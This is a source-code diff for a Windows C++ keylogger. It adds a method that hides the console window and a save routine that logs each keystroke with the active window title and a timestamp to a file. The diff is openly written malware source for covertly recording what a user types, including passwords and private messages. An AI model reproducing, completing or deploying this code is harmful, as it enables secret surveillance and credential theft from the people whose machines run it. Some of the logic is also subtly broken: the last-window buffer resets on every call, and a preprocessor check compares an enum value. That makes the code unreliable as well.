@@ -4,11 +4,12 @@
 #include <sstream>
 #include <map>
 
-Keylogger::Keylogger(LoggingFormat loggingFormat, OSManager manager, bool mouseIgnore)
-    : LOGGING_FORMAT(loggingFormat), manager_(manager), MOUSE_IGNORE(mouseIgnore)
+Keylogger::Keylogger(OSManager& manager, HookManager& hookManager)
+    : 	_LOGGING_FORMAT(LoggingFormat::Default), _MOUSE_IGNORE(true),
+		_manager(manager), _hookManager(hookManager)
 {
     #if LOGGING_FORMAT == LoggingFormat::Default
-        const std::map<int, std::string> VIRTUAL_KEY_NAME{ 
+        _VIRTUAL_KEY_NAME = { 
 	        {VK_BACK,       "[BACKSPACE]" },
 	        {VK_RETURN,	    "\n"          },
 	        {VK_SPACE,	    "_"           },
@@ -40,4 +41,86 @@ Keylogger::Keylogger(LoggingFormat loggingFormat, OSManager manager, bool mouseI
 	        {VK_CAPITAL,	"[CAPSLOCK]"  },
         };
     #endif
+};
+
+void Keylogger::Listen() {
+    this->_manager.setTerminalVisibility(false);
+}
+
+int Keylogger::save(int keyStroke) {
+	if (_MOUSE_IGNORE) {
+		if (keyStroke == VK_LBUTTON || keyStroke == VK_RBUTTON) 
+			return 0;
+	}
+
+	std::stringstream output;
+	char lastwindow[256] = "";
+
+	HWND foreground = GetForegroundWindow();
+	DWORD threadID;
+	HKL layout = NULL;
+
+	if (foreground)
+	{
+		threadID = GetWindowThreadProcessId(foreground, NULL);
+		layout = GetKeyboardLayout(threadID);
+	}
+
+	if (foreground)
+	{
+		char window_title[256];
+		GetWindowTextA(foreground, (LPSTR)window_title, 256);
+
+		if (strcmp(window_title, lastwindow) != 0)
+		{
+			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
+
+			time_t t = time(NULL);
+			struct tm tm;
+			localtime_s(&tm, &t);
+			char s[64];
+			strftime(s, sizeof(s), "%c", &tm);
+
+			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
+		}
+	}
+
+if (_LOGGING_FORMAT == 10){
+	output << '[' << keyStroke << ']';
+}
+else if (_LOGGING_FORMAT == 16){
+	output << std::hex << "[" << keyStroke << ']';
+}
+else{
+	if (_VIRTUAL_KEY_NAME.find(keyStroke) != _VIRTUAL_KEY_NAME.end())
+	{
+		output << _VIRTUAL_KEY_NAME.at(keyStroke);
+	}
+	else
+	{
+		char key;
+		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+
+		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
+			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+		{
+			lowercase = !lowercase;
+		}
+
+		key = MapVirtualKeyExA(keyStroke, MAPVK_VK_TO_CHAR, layout);
+
+		if (!lowercase)
+		{
+			key = tolower(key);
+		}
+		output << char(key);
+	}
+}
+	output_file << output.str();
+	output_file.flush();
+
+	std::cout << output.str();
+
+	return 0;
+
 }
